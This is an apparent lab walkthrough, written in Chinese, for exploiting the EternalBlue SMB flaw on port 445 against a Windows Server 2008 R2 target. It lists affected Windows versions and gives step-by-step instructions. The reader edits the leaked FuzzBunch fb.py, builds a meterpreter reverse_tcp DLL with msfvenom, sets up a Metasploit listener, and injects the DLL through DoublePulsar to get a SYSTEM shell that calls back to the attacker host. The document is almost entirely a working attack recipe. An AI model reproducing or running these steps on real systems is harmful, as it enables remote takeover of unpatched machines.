ETERNALBLUE

漏洞影响：2000/xpSp0/1/2/3/2003Sp0/1/2/3、VistaSp0/1/2/2008Sp1/2/xp_x86Sp0/1/2/3xp_x64Sp1/2/2003ServerSp0/1/2/Server2008Sp0/1/2/win7Sp0/1/Server2008R20/1/Win8Sp0/Server2012Sp0
利用条件：开启了445端口即可。

1.win7 x86（32位）攻击机1 ip:172.16.237.139
2.kali 攻击机2 ip:172.16.237.130
3.windows server 2008 R2 x64 靶机 ip:172.16.237.140

步骤1
将fb.py的26-28行代码以及72行代码注释掉。

#LP_DIR = os.path.join(FB_DIR, “listeningposts”)

#EDE_DIR = os.path.join(FB_DIR, “ede-exploits”)

#TRIGGER_DIR = os.path.join(FB_DIR, “triggers”)

#addplugins(fb, “ListeningPost”, LP_DIR, EDFPlugin)

步骤2
下载pywin32

步骤3
在windows目录下建立一个名为listeningposts的文件夹。

步骤4

运行fb.py
Target IP：这里填写靶机的IP
Callback IP：这里填写攻击机1的IP
第3个填no

选择新建项目
选择log路径

完成后 use Eternalblue

一路回车 mode选择1

完成后显示如下

步骤5
切换到攻击机2 kali
用msf生成一个恶意dll
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.237.130 LPORT=5555 -f dll > /opt/xxxxxx.dll
LHOST为kali ip
LPORT为自定端口

并将dll拷贝到攻击机1 C盘根目录下

步骤6
进入msf
开启msfpaylod监听
use exploit/multi/handler
set lhost 172.16.237.130 #kali ip
set lport 5555 #自定端口
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

这里漏了一步set PAYLOAD

步骤7
回到攻击机1 执行use Doublepulsar
根据提示选择系统版本和dll位置

步骤8
然后回到攻击机2 kali
弹回shell
得到到系统权限
